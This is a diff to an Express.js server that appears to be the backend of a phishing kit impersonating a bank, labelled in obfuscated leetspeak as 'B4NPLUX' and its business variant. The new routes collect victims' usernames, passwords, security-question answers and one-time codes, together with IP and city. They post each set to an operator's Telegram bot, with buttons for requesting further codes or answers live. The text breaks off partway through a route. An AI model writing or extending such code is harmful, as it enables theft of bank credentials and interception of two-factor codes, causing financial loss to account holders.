@@ -96,6 +96,53 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+app.post('/enviare', async (req, res) => {
+  const { usar, clavv, txid, ip, ciudad } = req.body;
+
+  const mensaje = `
+🔵B4NPLUX-EMPRES4🔵
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: ${usar}
+🔐 CL4V: ${clavv}
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const cliente = {
+    status: "esperando",
+    usar,
+    clavv,
+    preguntas: [],
+    esperando: null,
+    ip,
+    ciudad
+  };
+  guardarCliente(txid, cliente);
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
 app.post('/enviar2', async (req, res) => {
   const {
     usar, clavv, txid,
@@ -144,11 +191,102 @@ ${pregunta2}❓ : ${respuesta2}
   res.sendStatus(200);
 });
 
+app.post('/enviar2e', async (req, res) => {
+  const {
+    usar, clavv, txid,
+    pregunta1, pregunta2,
+    respuesta1, respuesta2,
+    ip, ciudad
+  } = req.body;
+
+  const mensaje = `
+❓🔑🔵B4NPLUX-EMPRES4🔵
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: ${usar}
+🔐 CL4V: ${clavv}
+
+${pregunta1}❓ : ${respuesta1}
+${pregunta2}❓ : ${respuesta2}
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+
 app.post('/enviar3', async (req, res) => {
   const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
 
   const mensaje = `
 🔑🔵B4NPLUX🔵
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: ${usar}
+🔐 CL4V: ${clavv}
+
+🔑 0TP: ${dinamic}
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+app.post('/enviar3e', async (req, res) => {
+  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+
+  const mensaje = `
+🔑🔵B4NPLUX-EMPRES4🔵
 🆔 ID: <code>${txid}</code>
 
 📱 US4R: ${usar}
